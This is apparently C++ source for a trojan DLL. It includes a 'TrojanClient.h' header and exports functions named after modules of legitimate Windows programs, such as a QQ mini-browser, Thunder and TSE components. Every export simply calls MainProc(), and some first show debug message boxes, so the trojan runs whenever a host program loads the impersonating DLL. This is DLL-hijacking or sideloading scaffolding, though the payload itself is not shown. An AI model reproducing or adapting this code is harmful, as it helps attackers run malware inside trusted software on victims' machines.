
#include <windows.h>
#include "Public.h"
#include "TrojanClient.h"


extern "C" __declspec(dllexport) int __cdecl GMBSImpl(int a1)
{
	MessageBoxA(0, "GMBSImpl", "GMBSImpl", MB_OK);
	MainProc();
	return 0;
}

extern "C" __declspec(dllexport) int __cdecl GetMiniBrowserServer(int a1)
{
	MessageBoxA(0, "GetMiniBrowserServer", "GetMiniBrowserServer", MB_OK);
	MainProc();
	return 0;
}


//qqminibrowser
extern "C" __declspec(dllexport) signed int Register()
{
	//MessageBoxA(0, "Register", "Register", MB_OK);
	MainProc();
	return 0;
}

extern "C" __declspec(dllexport) void *__stdcall liburl_1(int a1) {
	MessageBoxA(0, "liburl_1", "liburl_1", MB_OK);
	MainProc();
	return 0;
}

extern "C" __declspec(dllexport) signed int __stdcall TSEGetModule(int *a1) {
	MessageBoxA(0, "TSEGetModule", "TSEGetModule", MB_OK);
	MainProc();
	return 0;
}
extern "C" __declspec(dllexport) signed int __stdcall TSEGetModuleEx(int *a1) {
	MessageBoxA(0, "TSEGetModuleEx", "TSEGetModuleEx", MB_OK);
	MainProc();
	return 0;
}


extern "C" __declspec(dllexport) int __cdecl mini_unzip_dll(int a1, int a2) {
	MessageBoxA(0, "mini_unzip_dll", "mini_unzip_dll", MB_OK);
	MainProc();
	return 0;
}


extern "C" __declspec(dllexport) int __stdcall Launch(char * a1){
	MainProc();
	return 0;
}
extern "C" __declspec(dllexport) int __stdcall LaunchW(wchar_t * a1){
	MainProc();
	return 0;
}
extern "C" __declspec(dllexport) int Launch2(char * a1){
	MainProc();
	return 0;
}
extern "C" __declspec(dllexport) int Launch2W(wchar_t * a1){
	MainProc();
	return 0;
}




// extern "C" __declspec(dllexport) int __stdcall TSEGetModule(int *a1){
// 	MainProc();
// 	return 0;
// }
// extern "C" __declspec(dllexport) int __stdcall TSEGetModuleEx(int *a1){
// 	MainProc();
// 	return 0;
// }


extern "C" __declspec(dllexport) int __stdcall ThunderModule_Init(int a1){
	MainProc();
	return 0;
}
extern "C" __declspec(dllexport) void ThunderModule_Uninit(){
	MainProc();
	return ;
}